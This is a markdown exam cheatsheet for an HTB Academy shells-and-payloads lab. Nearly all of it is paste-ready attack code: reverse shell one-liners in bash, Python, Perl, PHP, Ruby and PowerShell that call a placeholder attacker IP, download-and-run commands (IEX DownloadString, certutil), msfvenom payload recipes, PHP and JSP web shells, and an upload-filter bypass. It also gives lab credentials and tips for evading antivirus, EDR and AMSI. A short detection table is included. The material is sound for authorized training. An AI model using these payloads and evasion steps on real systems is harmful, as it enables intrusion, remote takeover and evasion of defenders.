# Shells & Payloads — Exam Cheatsheet

**Distilled from HTB Academy "Shells and Payloads" module + Skills Assessment (3-host chain: Tomcat, Lightweight Blog, EternalBlue).** Open this during the exam.

---

## The Methodology

```
1. Listener bind IP — internal foothold IP, NOT VPN IP
2. Bind vs Reverse — reverse if NAT/firewall (90% of cases)
3. Pick payload OS + arch + protocol matching target & egress
4. Stage if you can (smaller, faster), staged caveat: needs same listener
5. Catch shell → STABILIZE immediately
6. Persist via web shell where possible (survives reboots/lockouts)
```

> **Forever rule:** Bind your listener to the IP the **target can reach** (foothold internal IP on a tiered lab; tun0 IP on direct VPN).

---

## Stage 0 — Network Setup

```bash
ip -br a                            # know your tun0 / internal IP
ss -tlnp                            # listening ports

# Add lab hostnames
echo "172.16.1.12 blog.inlanefreight.local" | sudo tee -a /etc/hosts
echo "172.16.1.11 status.inlanefreight.local" | sudo tee -a /etc/hosts

# Listeners (use ports >1024 unless root)
nc -lvnp 4444
sudo nc -lvnp 443                   # needs sudo
rlwrap -cAr nc -lvnp 4444           # readline + history
pwncat-cs -lp 4444                  # auto-stabilize, post-ex modules
```

---

## Stage 1 — Reverse Shell One-Liners (paste-ready)

### Linux
```bash
# Bash (most universal)
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1

# /dev/tcp without bash -i
sh -i 5<>/dev/tcp/10.10.14.X/4444 0<&5 1>&5 2>&5

# nc variants
nc 10.10.14.X 4444 -e /bin/bash
nc -e /bin/sh 10.10.14.X 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 4444 >/tmp/f      # mkfifo (no -e)

# Python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.X",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="10.10.14.X";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("10.10.14.X",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.X","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Awk
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.X/4444"; while(42) { do{ printf "shell> " |& s; s |& getline c; ... } } }'
```

### Windows (PowerShell)
```powershell
# Nishang Invoke-PowerShellTcp (the classic)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.X/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.X -Port 4444

# One-liner (no external file)
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.X',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# nc.exe (drop nc64.exe)
nc64.exe -e cmd.exe 10.10.14.X 4444

# certutil + powercat
certutil -urlcache -f http://10.10.14.X/powercat.ps1 powercat.ps1
. .\powercat.ps1; powercat -c 10.10.14.X -p 4444 -e cmd
```

---

## Stage 2 — Bind Shells

```bash
# Linux bind
nc -lvnp 4444 -e /bin/bash
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# Windows bind
nc.exe -lvnp 4444 -e cmd.exe

# Connect from attacker
nc TARGET 4444
```

---

## Stage 3 — MSFvenom (the BIG cheat)

```bash
# Format
msfvenom -p PAYLOAD LHOST=X LPORT=Y -f FORMAT -o out

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f elf -o sh.elf

# Linux x86 (older)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=X LPORT=Y -f elf -o sh32.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f exe -o s.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f exe -o m.exe
msfvenom -p windows/meterpreter/reverse_https LHOST=X LPORT=443 -f exe -o m.exe   # HTTPS = best egress

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f dll -o p.dll
# rundll32 p.dll,DllMain    OR    regsvr32 /s /n /u /i:p.dll

# WAR (Tomcat — Skills Assessment Host-01)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=X LPORT=Y -f war -o shell.war
# Deploy via Tomcat Manager → /shell/ to trigger

# JSP (raw)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=X LPORT=Y -f raw -o shell.jsp

# ASPX (IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f aspx -o s.aspx

# PHP
msfvenom -p php/reverse_php LHOST=X LPORT=Y -f raw -o shell.php
# Note: msfvenom omits leading <?php — prepend if needed:
echo '<?php' | cat - shell.php > tmp && mv tmp shell.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=X LPORT=Y -f raw -o sh.py

# macOS Mach-O
msfvenom -p osx/x64/shell_reverse_tcp LHOST=X LPORT=Y -f macho -o sh.macho

# Shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f c -o sc.c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f python -o sc.py

# Encoded (basic AV evasion — not enough alone)
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -e x86/shikata_ga_nai -i 10 -f exe -o e.exe

# List options
msfvenom -l payloads | grep linux/x64
msfvenom --list-options -p windows/x64/meterpreter/reverse_tcp
msfvenom -l formats
msfvenom -l encoders
```

### Catching MSFvenom payloads
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp     # MUST match payload
set LHOST 10.10.14.X
set LPORT 4444
set ExitOnSession false
run -j
```

> **Staged (`/`) vs Stageless (`_`)**:  `meterpreter/reverse_tcp` is staged; `meterpreter_reverse_tcp` is stageless.
> Staged is smaller but needs handler online when shellcode runs. Stageless = single self-contained blob — preferred when sneaking past EDR.

---

## Stage 4 — Stabilize Your Shell (do it IMMEDIATELY)

### Linux
```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# alt: script -qc /bin/bash /dev/null    or   /usr/bin/script -qc bash /dev/null
#      socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP4-LISTEN:4444 (preferred)

# 2. Set TERM
export TERM=xterm-256color
export SHELL=/bin/bash

# 3. Background, fix stty
^Z
stty raw -echo; fg
# (press enter twice)
stty rows 50 cols 200            # tab + history + arrow keys + signals all work
```

### socat (best stabilization, both ends)
```bash
# Attacker:
socat -d -d TCP-LISTEN:4444,reuseaddr,fork,bind=0.0.0.0 STDOUT
# Target:
socat TCP:10.10.14.X:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane

# Or full PTY both ways:
# Attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.X:4444
```

### Windows
```powershell
# ConPTY (Win10 1809+) — use conpty.ps1 / ConPtyShell
IEX(IWR -UseBasicParsing http://10.10.14.X/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell -RemoteIp 10.10.14.X -RemotePort 4444 -Rows 60 -Cols 200
# Attacker side (RAW listener):
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Or pwncat-cs auto-stabilizes
pwncat-cs -lp 4444
```

---

## Stage 5 — Web Shells

### PHP one-liners
```php
<?php system($_GET['c']); ?>                     # ?c=id
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?php eval($_REQUEST['x']); ?>                   # eval = stealthier
<?=`$_GET[0]`?>                                  # short tag, backticks
```

Drop & call:
```bash
echo '<?php system($_GET["c"]);?>' > /var/www/html/s.php
curl 'http://target/s.php?c=id'
curl 'http://target/s.php?c=bash%20-c%20%22bash%20-i%20>%26%20/dev/tcp/10.10.14.X/4444%200>%261%22'
```

### ASPX (IIS) — Antak / Laudanum
```bash
locate antak.aspx                # /usr/share/laudanum/aspx/antak.aspx
locate laudanum                  # ASP/PHP/JSP web shell collection
# Upload to writable web dir, browse to it, password = wewuw (default — change)
```

### JSP
```jsp
<%@ page import="java.util.*,java.io.*"%>
<% String c=request.getParameter("c"); Process p=Runtime.getRuntime().exec(c);
   BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
   String l; while((l=r.readLine())!=null) out.println(l); %>
```

### Webshell catalogues
- `/usr/share/webshells/{php,asp,aspx,jsp,perl}/`  (Kali)
- `https://github.com/tennc/webshell`
- `https://github.com/flozz/p0wny-shell` (single-file slick PHP)

### Make it interactive
```bash
# weevely — encrypted PHP web shell
weevely generate PASS shell.php
weevely http://target/shell.php PASS

# Chopper-style: just bash from CMD via webshell
curl 'http://target/s.php?c=...'                 # paste commands
```

---

## Stage 6 — Skills Assessment Recap (3-host chain)

| Host | Service | Vector | Listener | Lessons |
|------|---------|--------|----------|---------|
| 01 (172.16.1.11:8080) | Tomcat 10.0.11 | Manager creds `tomcat:Tomcatadm` → upload `shell.war` (`java/jsp_shell_reverse_tcp`) → `/shell/` | `nc -lvnp 4444` | Tomcat ≠ Linux (was Win Server 2019) |
| 02 (172.16.1.12) | Lightweight Blog | Image upload that validates `getimagesize()` → prepend PNG header bytes to PHP shell, keep `.php` ext → curl `Csrf-Token` flow → trigger | `nc -lvnp 4444` | URL-encode `#` as `%23`; manual curl beats Metasploit module |
| 03 (172.16.1.13) | SMB MS17-010 | `exploit/windows/smb/ms17_010_psexec` | LPORT=4445 (NOT 443; needs root) | Verify with `auxiliary/scanner/smb/smb_ms17_010` first |

```bash
# Image-validation bypass (Host-02)
echo -n 'iVBORw0KGgoAAAANSUhEUg...' | base64 -d > pngheader.bin
cat pngheader.bin shell.php > imgshell.php
curl -F "file=@imgshell.php;type=image/png;filename=shell.php" ...
```

---

## Stage 7 — Common Payload Type Quick Pick

| Target | Best payload | Format |
|--------|--------------|--------|
| Linux x64 generic | `linux/x64/shell_reverse_tcp` | elf |
| Windows EXE drop | `windows/x64/meterpreter/reverse_https` | exe |
| Windows EDR-heavy | stageless + obfuscate | exe / shellcode |
| Tomcat manager | `java/jsp_shell_reverse_tcp` | war |
| IIS upload | `windows/x64/shell_reverse_tcp` | aspx |
| LFI w/ phpinfo | `php/reverse_php` | raw |
| Office macro | `windows/meterpreter/reverse_https` | hta / vba |
| Linux LD_PRELOAD | shared object | so |
| Web RCE via Java | jar | jar |

---

## Stage 8 — Detection & Prevention (§15)

| IOC | Why it fires |
|-----|--------------|
| `nc.exe`, `nc64.exe` on disk | known-bad binary name |
| `cmd.exe` child of `w3wp.exe` (IIS) | webshell exec |
| `powershell -enc <base64>` | PS encoded cmd |
| `IEX (New-Object Net.WebClient).DownloadString(...)` | Sysmon EID 1, AMSI, ScriptBlock |
| AMSI bypass strings | "amsiInitFailed" detected |
| Outbound 4444/4445 | classic Metasploit ports — use 443/8443 |
| `/dev/tcp/` in bash audit logs | bash redirection to TCP |
| `_MEIPASS` / pyinstaller paths | Python EXE drop |

### Quick evasion
- Use **HTTPS payloads** (`reverse_https`) on **port 443**
- Stageless (`_` not `/`) for less network noise
- Encode/encrypt payloads, rename binaries (`svchost.exe`, `cu.exe`)
- `msfvenom` `--encrypt aes256 --encrypt-key K --encrypt-iv IV`
- Move from `nc.exe` to `socat`, `ConPtyShell`, `pwncat-cs`
- AMSI bypass before any IEX

---

## STUCK? Triage

| Symptom | Fix |
|---------|-----|
| Listener never connects | wrong IP (VPN vs internal); firewall on attacker; payload arch mismatch |
| Shell dies on Ctrl-C | not stabilized — `stty raw -echo; fg` |
| `bash: command not found` after PTY | export PATH/SHELL/TERM |
| Windows shell unresponsive | use ConPtyShell or pwncat-cs; raw stty mode |
| MSF handler "exploit completed, no session" | LHOST/LPORT mismatch; payload type vs handler PAYLOAD; egress blocked |
| AV deletes EXE during write | drop to SMB share, encrypt first, rename; `Add-MpPreference -ExclusionPath` if admin |
| WAR deploys but won't trigger | hit `/<warname>/` (no extension); check Tomcat logs |
| PHP shell returns blank | wrong tag (`<?` vs `<?php`); output buffering — use `passthru` |
| `<?php` missing from msfvenom output | manually prepend (`echo '<?php' \| cat - shell.php > t`) |
| EternalBlue port bind error | LPORT < 1024 → use 4445 (or sudo) |
| Image upload "not an image" | `getimagesize()` check — prepend real PNG/GIF magic bytes |

---

## References

- Section files: [04-Bind_Shells.md](04-Bind_Shells.md), [05-Reverse_Shells.md](05-Reverse_Shells.md), [06-Introduction_to_Payloads.md](06-Introduction_to_Payloads.md), [07-Automating_Payloads_with_Metasploit.md](07-Automating_Payloads_with_Metasploit.md), [08-Crafting_Payloads_with_MSFvenom.md](08-Crafting_Payloads_with_MSFvenom.md), [09-Infiltrating_Windows.md](09-Infiltrating_Windows.md), [10-Spawning_Interactive_Shells.md](10-Spawning_Interactive_Shells.md), [11-Introduction_to_Web_Shells.md](11-Introduction_to_Web_Shells.md), [12-Laudanum_Web_Shells.md](12-Laudanum_Web_Shells.md), [13-Antak_Webshell.md](13-Antak_Webshell.md), [14-PHP_Web_Shells.md](14-PHP_Web_Shells.md), [15-Detection_and_Prevention.md](15-Detection_and_Prevention.md)
- Skills walk-through: [SKILLS_ASSESSMENT_WRITEUP.md](SKILLS_ASSESSMENT_WRITEUP.md)
- External: [revshells.com](https://www.revshells.com), [GTFOBins](https://gtfobins.github.io), [LOLBAS](https://lolbas-project.github.io), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
